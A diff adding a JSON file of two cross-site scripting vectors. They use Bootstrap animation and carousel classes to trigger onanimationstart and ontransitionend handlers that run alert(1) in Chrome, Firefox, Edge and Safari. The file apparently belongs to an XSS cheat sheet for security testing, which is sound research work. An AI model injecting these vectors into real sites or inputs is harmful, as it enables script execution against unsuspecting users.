@@ -1,0 +1,22 @@
+[
+    {
+        "description": "Bootstrap onanimationstart event",
+        "code": "<xss class=progress-bar-animated onanimationstart=alert(1)>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Bootstrap ontransitionend event",
+        "code": "<xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    }
+]
